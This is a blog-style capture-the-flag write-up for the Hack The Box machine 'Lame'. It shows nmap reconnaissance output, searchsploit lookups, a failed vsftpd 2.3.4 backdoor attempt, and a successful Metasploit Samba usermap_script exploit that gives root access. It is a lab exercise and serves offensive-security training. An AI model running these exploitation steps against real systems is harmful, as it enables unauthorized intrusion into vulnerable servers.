---
layout: post
title: Hack The Box Lame
---
Brief:
Lame is a retired machine that is recommended if you want to do the OSCP exam. My focus was with this was to get through as far as I can without help and then check what to do next if I got stuck.


# Lame
10.10.10.3


nmap -sV -sC -oA Lame 10.10.10.3
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-04 09:36 EDT
Nmap scan report for 10.10.10.3
Host is up (0.21s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h55m54s, deviation: 0s, median: 3h55m54s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-04T09:33:17-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.83 seconds
```
Port 21 ftp is open
ncftp 10.10.10.3

ls
ls -lah
pwd
cd ..

exploring it there is nothing.
Port 21 is running vsftpd 2.3.4
Let’s see if there’s any exploits.

searchsploit vsftpd 2.3.4

vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                    | exploits/unix/remote/17491.rb

```
msfdb start
msfconsole

search vsftpd 2.3.4

use exploit/unix/ftp/vsftpd_234_backdoor 

show options

set RHOST 10.10.10.3

exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.

[*] Exploit completed, but no session was created.

back

exit
```
Exploit we tried didn’t work.
Seeing that port 445 is open and is known to be vulnerable we’ll look into that.
It is running Samba 3.0.20

searchsploit Samba 3.0.20

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)            
```
msfconsole

search samba 3.0.20

use exploit/multi/samba/usermap_script 

show options

exploit

Now we have access

cd root
cat root.txt

cd home
cd makis
cat user.txt
```

Tools used:
nmap
searchsploit
metasploit

